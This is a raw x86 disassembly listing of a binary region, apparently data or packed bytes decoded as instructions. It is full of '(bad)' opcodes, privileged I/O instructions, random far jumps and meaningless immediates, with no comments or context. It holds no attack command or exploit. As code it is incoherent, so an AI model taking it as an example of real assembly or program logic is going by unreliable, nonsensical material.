  418ac4:	es retf 
  418ac6:	ins    BYTE PTR es:[edi],dx
  418ac7:	mov    ah,0x15
  418ac9:	add    eax,0x50fbddb
  418ace:	icebp  
  418acf:	addr16 imul eax,edi,0xffffff84
  418ad3:	clc    
  418ad4:	lods   al,BYTE PTR ds:[esi]
  418ad5:	aaa    
  418ad6:	jmp    0x418b18
  418ad8:	ds inc ebp
  418ada:	sub    ebx,DWORD PTR [eax]
  418adc:	pop    es
  418add:	add    ebp,DWORD PTR [edx+0x122bc54a]
  418ae3:	out    dx,al
  418ae4:	xchg   DWORD PTR [ebp+0x12e7fc9c],edx
  418aea:	push   esi
  418aeb:	outs   dx,BYTE PTR ds:[esi]
  418aec:	jmp    0xef5baf9c
  418af1:	imul   edx,DWORD PTR [ebx-0x63],0x29233f81
  418af8:	ds ss aam 0x99
  418afc:	mov    ah,0x82
  418afe:	(bad)  
  418aff:	sub    eax,DWORD PTR [edi-0x5c]
  418b02:	into   
  418b03:	hlt    
  418b04:	leave  
  418b05:	out    0x7f,al
  418b07:	xchg   esi,eax
  418b08:	xor    eax,0x73a8014d
  418b0d:	pop    eax
  418b0e:	cs push 0xffffffcb
  418b11:	mov    DWORD PTR [edx+0x5ee016b1],ebx
  418b17:	push   ebx
  418b18:	and    DWORD PTR [ecx+0x45843915],esp
  418b1e:	retf   
  418b1f:	jp     0x418ad1
  418b21:	xor    al,0xb2
  418b23:	ss popf 
  418b25:	and    al,0xbf
  418b27:	dec    ebx
  418b28:	push   es
  418b29:	xor    ecx,eax
  418b2b:	inc    edi
  418b2c:	out    dx,al
  418b2d:	lock shl cl,0x26
  418b31:	test   DWORD PTR [ebp-0x1df0cd4a],0x1f52dbb7
  418b3b:	or     eax,0x7e252aeb
  418b40:	xchg   BYTE PTR ds:0x7120bb6d,cl
  418b46:	sbb    BYTE PTR [ecx-0x17],dh
  418b49:	cld    
  418b4a:	jecxz  0x418b9b
  418b4c:	jb     0xb0a2bbea
  418b52:	lods   al,BYTE PTR ds:[esi]
  418b53:	ss sbb dl,bh
  418b56:	cmp    dl,BYTE PTR [ecx+0x7a]
  418b59:	call   0xfbcf:0xa775ff4e
  418b60:	loope  0x418ae5
  418b62:	xchg   BYTE PTR [ebp-0x26e3b67c],cl
  418b68:	std    
  418b69:	bound  esi,QWORD PTR [ecx-0x5]
  418b6c:	sbb    eax,0x10dd03ac
  418b71:	ja     0x418b8a
  418b73:	xor    eax,0x399d7b4
  418b78:	xor    al,0x3e
  418b7a:	add    eax,0x486f45de
  418b7f:	lds    ebp,FWORD PTR [edi-0x4c]
  418b82:	out    0xc1,eax
  418b84:	xchg   ch,bh
  418b86:	xchg   esi,eax
  418b87:	mov    al,0xfa
  418b89:	cli    
  418b8a:	or     bl,BYTE PTR [edi+0xc]
  418b8d:	add    ebx,DWORD PTR [ebx+0x48]
  418b90:	addr16 fwait
  418b92:	mov    ecx,DWORD PTR [ebx]
  418b94:	lahf   
  418b95:	jecxz  0x418b46
  418b97:	pop    ds
  418b98:	sbb    DWORD PTR [edx-0x739c1885],edi
  418b9e:	repz neg DWORD PTR [esi]
  418ba1:	pop    esi
  418ba2:	out    dx,eax
  418ba3:	pushf  
  418ba4:	ins    DWORD PTR es:[edi],dx
  418ba5:	ror    BYTE PTR ds:0xb348b341,1
  418bab:	pop    ecx
  418bac:	pop    ecx
  418bad:	sbb    al,0xb6
  418baf:	or     ebx,edi
  418bb1:	pop    ebp
  418bb2:	js     0x418bf4
  418bb4:	push   0x53
  418bb6:	mov    dh,0x48
  418bb8:	loop   0x418b43
  418bba:	daa    
  418bbb:	inc    ebx
  418bbc:	sti    
  418bbd:	mov    dh,0xfc
  418bbf:	dec    esi
  418bc0:	jg     0x418b93
  418bc2:	(bad)
  418bc7:	hlt    
  418bc8:	test   DWORD PTR [edx],edx
  418bca:	mov    ds:0xf67d0627,eax
  418bcf:	jl     0x418c22
  418bd1:	mov    esp,0xce2add80
  418bd6:	xchg   bh,dl
  418bd8:	out    dx,al
  418bd9:	add    DWORD PTR [ecx],0xffffff86
  418bdc:	xor    al,BYTE PTR [edx+edi*4+0x5]
  418be0:	xchg   ebx,eax
  418be1:	aad    0x66
  418be3:	shr    ebx,1
  418be5:	jl     0x418c51
  418be7:	or     DWORD PTR [edi+0x5f],esi
  418bea:	xchg   esp,eax
  418beb:	out    dx,al
  418bec:	shl    ebp,cl
  418bee:	pop    eax
  418bef:	xor    dl,ch
  418bf1:	pop    esi
  418bf2:	lahf   
  418bf3:	xor    al,0xf6
  418bf5:	jmp    0x833a:0xae4e5cd5
  418bfc:	or     BYTE PTR [ecx+0x5a],dl
  418bff:	inc    ebp
  418c00:	inc    ebx
  418c01:	call   0xaae6e03e
  418c06:	stos   BYTE PTR es:[edi],al
  418c07:	ja     0x418bb8
  418c09:	addr16 mov ecx,0xe0e76959
  418c0f:	gs stos DWORD PTR es:[edi],eax
  418c11:	or     eax,0x4469a83e
  418c16:	cli    
  418c17:	pop    ecx
  418c18:	stos   DWORD PTR es:[edi],eax
  418c19:	and    DWORD PTR [ebx+ebx*4+0x36b1b3b1],esp
  418c20:	scas   eax,DWORD PTR es:[edi]
  418c21:	and    eax,DWORD PTR [ecx-0x54efebb0]
  418c27:	mov    esi,0x8ef965c5
  418c2c:	pop    eax
  418c2d:	retf   0x7e41
  418c30:	jp     0x418ca6
  418c32:	pop    edx
  418c33:	xchg   BYTE PTR [edx+0x72ceffbd],al
  418c39:	lds    edx,FWORD PTR [eax+0xb8dcbbb]
  418c3f:	mov    ebp,0x6a7ae73a
  418c44:	sar    BYTE PTR [edi+eiz*4-0x5c],cl
  418c48:	stos   DWORD PTR es:[edi],eax
  418c49:	or     bh,BYTE PTR [ebx]
  418c4b:	xor    ecx,DWORD PTR [ecx]
  418c4d:	ret    
  418c4e:	mov    bh,0xe8
  418c50:	sbb    BYTE PTR [edx-0x2085b8d4],0x7d
  418c57:	js     0x418c6b
  418c59:	push   ebp
  418c5a:	fmul   QWORD PTR [ecx]
  418c5c:	dec    esp
  418c5d:	jecxz  0x418c9f
  418c5f:	imul   ebx,DWORD PTR [ebx+0x7231af2b],0x412695c2
  418c69:	mov    ebp,0x66640355
  418c6e:	ins    DWORD PTR es:[edi],dx
  418c6f:	icebp  
  418c70:	loope  0x418c1c
  418c72:	iret   
  418c73:	(bad)  
  418c75:	js     0x418ce5
  418c77:	fwait
  418c78:	dec    ecx
  418c79:	sub    BYTE PTR [eax],dh
  418c7b:	adc    cl,BYTE PTR [ecx]
  418c7d:	sub    dh,al
  418c7f:	daa    
  418c80:	rcr    ecx,0xa1
  418c83:	and    eax,0xeb25cddc
  418c88:	in     eax,dx
  418c89:	cmp    al,0x3d
  418c8b:	or     BYTE PTR [ecx+0xc8aa356],dh
  418c91:	in     eax,dx
  418c92:	call   0x9f07:0xe0959863
  418c99:	pop    edx
	...
  418d12:	add    BYTE PTR [eax],al
  418d14:	jecxz  0x418d35
  418d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d17:	adc    al,0xfe
  418d19:	mov    ebp,0x9faffff3
  418d1e:	test   ah,0xe9
  418d21:	xor    BYTE PTR [esi+0x12ecfda],0x0
  418d28:	outs   dx,BYTE PTR ds:[esi]
  418d29:	pop    es
  418d2a:	add    BYTE PTR [eax],al
  418d2c:	popa   
  418d2d:	inc    ecx
  418d2e:	cli    
  418d2f:	daa    
  418d30:	shl    BYTE PTR [esi],0xe8
  418d33:	pop    esi
  418d34:	sbb    eax,0xa3f4f10f
  418d39:	gs mov bl,0xf3
  418d3c:	ss mov esi,0x2555f03b
  418d42:	dec    ebp
  418d43:	sub    BYTE PTR [edi+ebx*4-0x565f57d5],ah
  418d4a:	stos   DWORD PTR es:[edi],eax
  418d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d4c:	stc    
  418d4d:	idiv   DWORD PTR [eax+0x4694c968]
  418d53:	(bad)  
  418d54:	xor    dh,BYTE PTR [esi+0xa]
  418d57:	scas   eax,DWORD PTR es:[edi]
  418d58:	mov    ebp,0x6ec36874
  418d5d:	xor    dh,BYTE PTR [eax]
  418d5f:	pop    esi
  418d60:	jmp    0xacfc:0x8b4769ed
  418d67:	mov    esp,DWORD PTR ds:0x555f3a7d
  418d6d:	leave  
  418d6e:	xchg   BYTE PTR [edx-0x11],dh
  418d71:	popa   
  418d72:	sub    bh,dh
  418d74:	repnz mov bl,0xe7
  418d77:	int    0xda
  418d79:	dec    ecx
  418d7a:	fdiv   QWORD PTR [ecx]
  418d7c:	iret   
  418d7d:	mov    bh,0xbf
  418d7f:	icebp  
  418d80:	jg     0x418d70
  418d82:	jmp    FWORD PTR [esi-0x47]
  418d85:	fbld   TBYTE PTR [bx-0x7a]
  418d89:	arpl   WORD PTR [esi-0x60f620c],bx
  418d8f:	cwde   
  418d90:	mov    BYTE PTR [ebp-0x6],cl
  418d93:	add    dl,BYTE PTR [edx+0x5c]
  418d96:	es xchg ecx,eax
  418d98:	mov    esi,cs
  418d9a:	das    
  418d9b:	xchg   ecx,eax
  418d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d9d:	sti    
  418d9e:	data16 stc 
  418da0:	and    ch,0xba
  418da3:	mov    ebx,0x873f51a7
  418da8:	pushf  
  418da9:	sbb    al,0x47
  418dab:	ja     0x418e01
  418dad:	mov    edx,0xd33a531e
  418db2:	dec    edi
  418db3:	sub    edi,DWORD PTR [eax-0x39d91dfa]
  418db9:	xchg   BYTE PTR [eax+0x2b],al
  418dbc:	pop    es
  418dbd:	imul   ecx,ecx,0xffffffed
  418dc0:	iret   
  418dc1:	jmp    0x2464611c
  418dc6:	sub    DWORD PTR [esi],ebp
  418dc8:	xor    eax,0x40223cd4
  418dcd:	add    ebp,DWORD PTR [edi+0x16bbca74]
  418dd3:	xor    bh,bl
  418dd5:	shr    ch,0xce
  418dd8:	and    BYTE PTR [edi],al
  418dda:	aaa    
  418ddb:	dec    ecx
  418ddc:	pop    edi
  418ddd:	in     al,0xf1
  418ddf:	and    cl,ah
  418de1:	pop    ebx
  418de2:	xchg   esi,eax
  418de3:	cmc    
  418de4:	pop    ebx
  418de5:	js     0x418df0
  418de7:	push   0xffffff94
  418de9:	rcl    DWORD PTR [ebx+0x34bd1ac],0x56
  418df0:	pusha  
  418df1:	(bad)  
  418df2:	and    edi,esp
  418df4:	cmp    DWORD PTR [edi],edx
  418df6:	loope  0x418e44
  418df8:	repz call 0x50ad3a6b
  418dfe:	retf   
  418dff:	repnz push esp
  418e01:	inc    ebx
  418e02:	imul   ebx,edx,0x44
  418e05:	inc    ebx
  418e06:	inc    ebp
  418e07:	xor    cl,bl
  418e09:	leave  
  418e0a:	sbb    ecx,edx
  418e0c:	mov    ebp,0x932b054
  418e11:	xchg   ecx,eax
  418e12:	xchg   esi,eax
  418e13:	xor    BYTE PTR [ecx-0x17eed707],ah
  418e19:	mov    dh,BYTE PTR [eax-0x17]
  418e1c:	sbb    DWORD PTR [edi+0x57],esp
  418e1f:	mov    eax,ds:0x7a4e84ad
  418e24:	inc    edx
  418e25:	jmp    FWORD PTR [edx+edx*4]
  418e28:	cmp    ah,al
  418e2a:	call   0xd365869
  418e2f:	push   edi
  418e30:	jl     0x418e4c
  418e32:	sbb    dh,BYTE PTR [eax]
  418e34:	sbb    eax,0xefab03dd
  418e39:	inc    edx
  418e3a:	icebp  
  418e3b:	xor    eax,ebx
  418e3d:	lods   al,BYTE PTR ds:[esi]
  418e3e:	cwde   
  418e3f:	popf   
  418e40:	ins    BYTE PTR es:[edi],dx
  418e41:	sbb    bh,BYTE PTR [ebp-0x5c47e272]
  418e47:	lock loope 0x418e72
  418e4a:	push   edi
  418e4b:	cmc    
  418e4c:	mov    ch,0xd5
  418e4e:	icebp  
  418e4f:	add    dh,bl
  418e51:	bnd jg 0x418dee
  418e54:	and    DWORD PTR [edx-0x105803df],ebx
  418e5a:	mov    cl,0x50
  418e5c:	push   cs
  418e5d:	scas   eax,DWORD PTR es:[edi]
  418e5e:	adc    edx,eax
  418e60:	pop    ds
  418e61:	lods   al,BYTE PTR ds:[esi]
  418e62:	or     DWORD PTR [edx],edx
  418e64:	inc    eax
  418e65:	es push esi
  418e67:	ror    dh,cl
  418e69:	leave  
  418e6a:	inc    edx
  418e6b:	sub    eax,0x3abd028b
  418e70:	int    0xb7
  418e72:	xchg   ebx,eax
  418e73:	das    
  418e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e75:	dec    ecx
  418e76:	(bad)  
  418e77:	jle    0x418e0e
  418e79:	xchg   esi,eax
  418e7a:	(bad)  
  418e7b:	icebp  
  418e7c:	or     al,0x40
  418e7e:	xchg   esp,eax
  418e7f:	inc    edi
  418e80:	mov    ebp,0x674139b9
  418e85:	aad    0x7f
  418e87:	ins    DWORD PTR es:[edi],dx
  418e88:	fld    TBYTE PTR [esi-0x8]
  418e8b:	mov    WORD PTR [ecx],ss
  418e8d:	cli    
  418e8e:	inc    edx
  418e8f:	add    esi,esp
  418e91:	adc    WORD PTR [ebp+0x72a6b5ac],0xd6b3
  418e9a:	or     bl,al
  418e9c:	out    dx,eax
  418e9d:	popf   
  418e9e:	cmp    al,0x4
  418ea0:	mov    edi,0x73af545b
  418ea5:	xor    al,0x89
  418ea7:	sar    DWORD PTR es:[edx],1
  418eaa:	mov    cl,0x96
  418eac:	ss scas al,BYTE PTR es:[edi]
  418eae:	retf   0xd3f7
  418eb1:	sbb    BYTE PTR [edx-0x4de8470d],cl
  418eb7:	inc    ebx
  418eb8:	push   esi
  418eb9:	bound  ecx,QWORD PTR [ebp+0x6f]
  418ebc:	loopne 0x418ed1
  418ebe:	push   ds
  418ebf:	lock cmp ebx,esi
  418ec2:	(bad)  
  418ec3:	push   0xffffffbc
  418ec5:	lahf   
  418ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ec7:	call   0xd8e1:0x56376ef7
  418ece:	jbe    0x418e70
  418ed0:	repnz out 0xfe,al
  418ed3:	mov    eax,ds:0x3fb1abde
  418ed8:	add    cl,ah
  418eda:	and    ebx,DWORD PTR [ecx+0x33]
  418edd:	push   esp
  418ede:	ds cs push edi
  418ee1:	xor    esp,0xffffffcf
  418ee4:	out    0x55,eax
  418ee6:	or     al,0x4
  418ee8:	mov    ds:0xd1aafb55,eax
  418eed:	cmc    
  418eee:	dec    ecx
  418eef:	xchg   ebp,eax
  418ef0:	cmc    
  418ef1:	cmp    eax,0xc853183b
  418ef6:	lods   al,BYTE PTR ds:[esi]
  418ef7:	mov    eax,0xab44e4ca
  418efc:	mov    al,ch
  418efe:	pop    ss
  418eff:	mov    ebx,0x2b25944
  418f04:	xchg   edi,eax
  418f05:	sub    dl,BYTE PTR [ebp+0x7fb65979]
  418f0b:	shr    ebp,1
  418f0d:	xchg   esi,eax
  418f0e:	fist   DWORD PTR [esi]
  418f10:	dec    esp
  418f11:	xchg   DWORD PTR [edi-0xb0a0bc5],edx
  418f17:	test   eax,0x924d7bf6
  418f1c:	scas   al,BYTE PTR es:[edi]
  418f1d:	xor    BYTE PTR [ecx+0x1c0e572d],bl
  418f23:	aas    
  418f24:	ror    DWORD PTR [esp+ecx*8-0x125f0cd5],0x61
  418f2c:	into   
  418f2d:	mov    bh,0xc9
  418f2f:	mov    bh,dl
  418f31:	popa   
  418f32:	cwde   
  418f33:	inc    esi
  418f34:	or     al,0x54
  418f36:	mov    edx,0xb20700c8
  418f3b:	mov    eax,ds:0xe45aa76d
  418f40:	stos   BYTE PTR es:[edi],al
  418f41:	ins    DWORD PTR es:[edi],dx
  418f42:	sub    dl,ch
  418f44:	inc    esp
  418f45:	test   al,0xa9
  418f47:	jne    0x418f3e
  418f49:	dec    edi
  418f4a:	xlat   BYTE PTR ds:[ebx]
  418f4b:	fcomp  DWORD PTR [ebx]
  418f4d:	inc    ecx
  418f4e:	push   ebx
  418f4f:	iret   
  418f50:	pop    esi
  418f51:	add    al,0xc0
  418f53:	xchg   esp,eax
  418f54:	mov    ds:0xb9786135,eax
  418f59:	mov    dl,0x9c
  418f5b:	push   edi
  418f5c:	pushf  
  418f5d:	add    eax,0xbe853008
  418f62:	mov    esi,0x1219c5eb
  418f67:	(bad)  
  418f68:	xchg   edi,eax
  418f69:	or     DWORD PTR [ebx-0x64],edi
  418f6c:	aas    
  418f6d:	cmp    al,BYTE PTR [edx-0x3c5e1105]
  418f73:	jbe    0x418f26
  418f75:	dec    edx
  418f76:	loop   0x418f6d
  418f78:	xchg   esp,eax
  418f79:	sbb    esp,DWORD PTR [edx-0x7cb6a146]
  418f7f:	test   ecx,edi
  418f81:	inc    ebp
  418f82:	dec    esp
  418f83:	mov    ecx,eax
  418f85:	push   ebx
  418f86:	xor    al,0xd9
  418f88:	lods   al,BYTE PTR ds:[esi]
  418f89:	push   ecx
  418f8a:	or     eax,0xd4d32637
  418f8f:	(bad)  
  418f90:	xor    al,0xf6
  418f92:	xor    DWORD PTR [eax+0x20],ebp
  418f95:	daa    
  418f96:	xor    ch,BYTE PTR [ebx-0x4e]
  418f99:	lahf   
  418f9a:	loope  0x418f8e
  418f9c:	(bad)  
  418f9d:	out    dx,eax
  418f9e:	jmp    0x8b82:0x76186ccf
  418fa5:	stc    
  418fa6:	pusha  
  418fa7:	sub    DWORD PTR [ebx],ebx
  418fa9:	jo     0x418f70
  418fab:	mov    ch,0xaf
  418fad:	mov    edi,0x3f00d2dd
  418fb2:	jne    0x41902d
  418fb4:	fst    DWORD PTR [ebx-0x71]
  418fb7:	mov    ebp,gs
  418fb9:	push   eax
  418fba:	push   DWORD PTR [edi]
  418fbc:	push   ecx
  418fbd:	mov    ebp,DWORD PTR [ebx]
  418fbf:	sbb    dh,ch
  418fc1:	cdq    
  418fc2:	and    DWORD PTR [eax+0x47],ecx
  418fc5:	in     al,0x90
  418fc7:	jns    0x418f6d
  418fc9:	dec    edi
  418fca:	sbb    dl,BYTE PTR [eax+0x47]
  418fcd:	iret   
  418fce:	xor    DWORD PTR [ebx+0x54f0787f],edi
  418fd4:	fist   WORD PTR [esp]
  418fd7:	dec    ebx
  418fd8:	mov    dl,0xc5
  418fda:	push   DWORD PTR [ebp-0x6125cb25]
  418fe0:	pop    bx
  418fe2:	ins    DWORD PTR es:[edi],dx
  418fe3:	jb     0x418f86
  418fe5:	addr16 cmp eax,0x6412980f
  418feb:	arpl   WORD PTR [edx],si
  418fed:	data16 jne 0x418f79
  418ff0:	inc    esp
  418ff1:	das    
  418ff2:	ret    
  418ff3:	xchg   edi,ebx
  418ff5:	lock mov ecx,0x8607be9b
  418ffb:	dec    ebx
  418ffc:	out    0x86,al
  418ffe:	out    0x3f,eax
  419000:	loopne 0x418ff4
  419002:	push   ss
  419003:	cmp    dl,BYTE PTR [ebp-0xb]
  419006:	leave  
  419007:	cld    
  419008:	std    
  419009:	inc    edx
  41900a:	into   
  41900b:	or     ebp,DWORD PTR [ebx]
  41900d:	push   eax
  41900e:	fistp  QWORD PTR [esi+0x0]
  419011:	mov    WORD PTR [edx],ds
  419013:	jmp    0x8be511fe
  419018:	dec    ecx
  419019:	inc    esi
  41901a:	sub    DWORD PTR [ebp+0xc300a59],edi
  419020:	mov    al,ds:0x5c63f170
  419025:	pushf  
  419026:	dec    esp
  419027:	fiadd  WORD PTR [ecx]
  419029:	xchg   DWORD PTR [edx+0x62],edi
  41902c:	push   edi
  41902d:	lahf   
  41902e:	je     0x418ffe
  419030:	arpl   WORD PTR [esi],si
  419032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419033:	fisttp QWORD PTR es:[ebp-0x6e]
  419037:	(bad)  
  419038:	xor    al,0xf9
  41903a:	icebp  
  41903b:	push   ebx
  41903c:	es dec ebp
  41903e:	stos   DWORD PTR es:[edi],eax
  41903f:	sbb    dh,0x8d
  419042:	(bad)  
  419043:	dec    eax
  419044:	sar    DWORD PTR [esi],1
  419046:	cdq    
  419047:	pop    ebp
  419048:	push   ecx
  419049:	bnd jnp 0x41909f
  41904c:	sbb    edi,DWORD PTR [edi*4+0x7ea94505]
  419053:	inc    esp
  419054:	sub    BYTE PTR [eax-0x37],cl
  419057:	jb     0x41903b
  419059:	sub    DWORD PTR [edx+0x3120ab62],eax
  41905f:	gs pop ss
  419061:	es int 0x63
  419064:	or     al,0xd
  419066:	ins    BYTE PTR es:[edi],dx
  419067:	shl    BYTE PTR [eax],0xd5
  41906a:	icebp  
  41906b:	cmp    ecx,DWORD PTR [eax-0x7f5f392e]
  419071:	inc    ebp
  419072:	out    0x5d,al
  419074:	sub    ecx,ebp
  419076:	hlt    
  419077:	fstp   TBYTE PTR [esi]
  419079:	jp     0x41903c
  41907b:	retf   
  41907c:	addr16 fsubr st(3),st
  41907f:	fs (bad) 
  419081:	xor    eax,DWORD PTR [ebx+eiz*4-0x4e783040]
  419088:	adc    dh,BYTE PTR [esi-0x2ae3a24c]
  41908e:	jge    0x4190ac
  419090:	adc    BYTE PTR [esi-0x5e817894],cl
  419096:	inc    esp
  419097:	loop   0x4190da
  419099:	and    al,0x83
  41909b:	mov    eax,ds:0xcd1db98
  4190a0:	outs   dx,DWORD PTR ds:[esi]
  4190a1:	and    ebx,edx
  4190a3:	(bad)  
  4190a4:	icebp  
  4190a5:	data16 or al,0xfd
  4190a8:	push   ebp
  4190a9:	or     dl,BYTE PTR [eax+0x2ac18371]
  4190af:	xchg   esi,eax
  4190b0:	push   ss
  4190b1:	add    esi,DWORD PTR [edx*1+0x4e044fc8]
  4190b8:	sbb    esi,eax
  4190ba:	jg     0x41904e
  4190bc:	pop    es
  4190bd:	ins    BYTE PTR es:[edi],dx
  4190be:	das    
  4190bf:	mov    edi,0x7b717d8f
  4190c4:	fsub   QWORD PTR [edi-0x25b84433]
  4190ca:	sbb    ebx,DWORD PTR [edi]
  4190cc:	xchg   BYTE PTR [edx+0x15],ch
  4190cf:	aad    0x3d
  4190d1:	test   BYTE PTR [ebp-0x4a],ah
  4190d4:	push   edx
  4190d5:	xor    DWORD PTR [ecx+eiz*2],esi
  4190d8:	repz lds edx,FWORD PTR [edx+0x7b5ab8a0]
  4190df:	mov    ebx,0xfa71b0f5
  4190e4:	stc    
  4190e5:	inc    edx
  4190e6:	dec    ecx
  4190e7:	(bad)  
  4190e8:	aam    0xbc
  4190ea:	nop
  4190eb:	or     bl,BYTE PTR [ebx]
  4190ed:	aas    
  4190ee:	psubw  mm3,QWORD PTR [ecx-0x74]
  4190f2:	dec    ebx
  4190f3:	daa    
  4190f4:	and    DWORD PTR [eax-0xc],ebp
  4190f7:	push   esp
  4190f8:	stos   DWORD PTR es:[edi],eax
  4190f9:	jnp    0x419159
  4190fb:	ror    DWORD PTR [esi-0x5ee1c1bf],1
  419101:	ret    0xe166
  419104:	mov    WORD PTR [ebx-0x52615d33],ss
  41910a:	mov    al,0xc
  41910c:	pop    ebx
  41910d:	push   ebp
  41910e:	xchg   esp,eax
  41910f:	jl     0x4190d5
  419111:	inc    esi
  419112:	mov    BYTE PTR [eax],cl
  419114:	loop   0x419107
  419116:	iret   
  419117:	adc    DWORD PTR [edi-0x7],esp
  41911a:	in     eax,0xe
  41911c:	mov    al,0x8f
  41911e:	mov    WORD PTR [edi+esi*4-0x39ac95a5],?
  419125:	adc    eax,0x18977efe
  41912a:	jmp    0xb700:0x209795a4
  419131:	inc    eax
  419132:	inc    eax
  419133:	enter  0x170a,0x9f
  419137:	pop    ecx
  419138:	or     bl,BYTE PTR [edx+esi*8]
  41913b:	or     BYTE PTR [ecx],al
  41913d:	aad    0xe9
  41913f:	adc    DWORD PTR [eax-0x5deb086a],0x8e83d877
  419149:	sti    
  41914a:	in     eax,0x23
  41914c:	hlt    
  41914d:	push   esi
  41914e:	push   eax
  41914f:	cld    
  419150:	inc    eax
  419151:	popa   
  419152:	sti    
  419153:	push   ebx
  419154:	retf   0x38dd
  419157:	shl    esi,cl
  419159:	push   eax
  41915a:	mov    esi,DWORD PTR [ecx-0x3f064aed]
  419160:	pop    esp
  419161:	jbe    0x4191ce
  419163:	dec    edi
  419164:	cwde   
  419165:	sahf   
  419166:	jg     0x41913a
  419168:	xchg   ah,ch
  41916a:	in     al,0x39
  41916c:	sar    dl,cl
  41916e:	xor    BYTE PTR [eax],0x6c
  419171:	rcr    BYTE PTR fs:[ecx],1
  419174:	dec    edx
  419175:	aas    
  419176:	test   BYTE PTR [edx-0x5587f630],dh
  41917c:	aad    0x42
  41917e:	jnp    0x419171
  419180:	mov    al,0x70
  419182:	nop
  419183:	gs loop 0x41915c
  419186:	xchg   ebp,eax
  419187:	sub    eax,0xd31abc5b
  41918c:	jb     0x41919d
  41918e:	pushf  
  41918f:	inc    esi
  419190:	test   BYTE PTR [ebp+0x55],al
  419193:	push   edi
  419194:	or     al,0x19
  419196:	hlt    
  419197:	shl    BYTE PTR [eax+0x6],1
  41919a:	or     ah,BYTE PTR [ebx+0x5669060f]
  4191a0:	in     al,0x3e
  4191a2:	inc    ebx
  4191a3:	or     bl,ah
  4191a5:	into   
  4191a6:	xor    ebx,0xffffffff
  4191a9:	je     0x419140
  4191ab:	loopne 0x419201
  4191ad:	lahf   
  4191ae:	jecxz  0x4191b1
  4191b0:	mov    WORD PTR [eax],ds
  4191b2:	sub    ebp,DWORD PTR [edx+0x37]
  4191b5:	inc    ecx
  4191b6:	out    dx,eax
  4191b7:	xor    cl,BYTE PTR [esi-0xc728b17]
  4191bd:	dec    ebp
  4191be:	ins    DWORD PTR es:[edi],dx
  4191bf:	xchg   edi,eax
  4191c0:	push   ds
  4191c1:	jmp    0x73c5e3d1
  4191c6:	int3   
  4191c7:	test   eax,esp
  4191c9:	and    al,BYTE PTR [ebx]
  4191cb:	ins    BYTE PTR es:[edi],dx
  4191cc:	sub    al,0x99
  4191ce:	or     ch,ah
  4191d0:	pop    esp
  4191d1:	pop    ebp
  4191d2:	pusha  
  4191d3:	imul   esp,edi,0x50620b59
  4191d9:	fcom   DWORD PTR [ecx+0x16]
  4191dc:	cmp    al,0x9
  4191de:	sar    DWORD PTR [edx-0x66],0x83
  4191e2:	sub    BYTE PTR [ebx-0x7b],ch
  4191e5:	aas    
  4191e6:	sbb    eax,0xe5b4b86b
  4191eb:	mov    ebx,0x38e922dc
  4191f0:	jmp    0xc5d2:0x83f37096
  4191f7:	mov    esp,0x9a891967
  4191fc:	jmp    0x2216:0x32e6838d
  419203:	lahf   
  419204:	ss pop eax
  419206:	(bad)  
  419207:	retf   
  419208:	aam    0x47
  41920a:	ret    
  41920b:	add    BYTE PTR [edx],cl
  41920d:	stc    
  41920e:	repz cmp ecx,esi
  419211:	add    edx,DWORD PTR [edx+eax*1+0x2d]
  419215:	ret    
  419216:	das    
  419217:	or     BYTE PTR [edi+ecx*2-0x4640ece9],dh
  41921e:	cmp    al,0x4
  419220:	add    dh,bh
  419222:	pusha  
  419223:	or     ebx,DWORD PTR [ebp+0x6]
  419226:	repnz imul ebp,DWORD PTR [ebx+0x5aefaa44],0xe701cd5e
  419231:	dec    esp
  419232:	lods   al,BYTE PTR ds:[esi]
  419233:	jmp    0x6a2c:0xa630b5e4
  41923a:	test   DWORD PTR [edx-0x30],edx
  41923d:	pop    ss
  41923e:	dec    ebp
  41923f:	jl     0x4191c4
  419241:	and    DWORD PTR [ebx-0x51568545],esp
  419247:	icebp  
  419248:	push   ecx
  419249:	addr16 aam 0x59
  41924c:	cmp    eax,0x5a6d19ab
  419251:	popa   
  419252:	or     al,0x3e
  419254:	in     al,0xa5
  419256:	gs sbb al,0x4c
  419259:	pop    ds
  41925a:	mov    edx,0x7a6d6ec3
  41925f:	(bad)  
  419260:	stc    
  419261:	(bad)  
  419262:	(bad)  
  419263:	adc    bh,al
  419265:	das    
  419266:	call   0x8bd3:0x44abb8b0
  41926d:	mov    ds:0x4b331545,al
  419272:	in     eax,dx
  419273:	sub    eax,0xa64cc9b2
  419278:	daa    
  419279:	rcl    BYTE PTR [ebp-0x39590f8f],cl
  41927f:	(bad)  
  419280:	push   ebp
  419281:	call   0xc4db:0x403ea244
  419288:	or     eax,0x8c5a26af
  41928d:	into   
  41928e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41928f:	cmp    eax,0xf6d5a57d
  419294:	lods   eax,DWORD PTR ds:[esi]
  419295:	pushf  
  419296:	js     0x4192db
  419298:	ja     0x419233
  41929a:	xchg   ecx,eax
  41929b:	push   edx
  41929c:	push   ss
  41929d:	(bad)  
  41929e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41929f:	sbb    BYTE PTR [esi+edx*1-0x222c90f0],dl
  4192a6:	xabort 0x88
  4192a9:	xchg   BYTE PTR [eax-0x31],bl
  4192ac:	inc    ebp
  4192ad:	dec    eax
  4192ae:	stc    
  4192af:	xor    ecx,0xed4783fb
  4192b5:	call   0xf9c27c48
  4192ba:	xchg   esp,eax
  4192bb:	(bad)  
  4192bc:	js     0x41928b
  4192be:	or     bl,ah
  4192c0:	jne    0x41932c
  4192c2:	daa    
  4192c3:	sbb    ah,BYTE PTR [ebx-0x1c]
  4192c6:	in     al,0xa0
  4192c8:	mov    cl,0xc4
  4192ca:	fs ins BYTE PTR es:[edi],dx
  4192cc:	inc    esi
  4192cd:	inc    edx
  4192ce:	mov    eax,0xb498c81a
  4192d3:	xor    esp,eax
  4192d5:	fisttp WORD PTR [ebx-0x3e]
  4192d8:	out    0x62,al
  4192da:	or     cl,BYTE PTR [eax]
  4192dc:	mov    DWORD PTR [ecx+0x444e4131],eax
  4192e2:	add    ebx,DWORD PTR [esi+0x53]
  4192e5:	lahf   
  4192e6:	mov    esi,edx
  4192e8:	sbb    eax,0x57caafe5
  4192ed:	inc    esp
  4192ee:	cdq    
  4192ef:	mov    ds:0x65a45d70,al
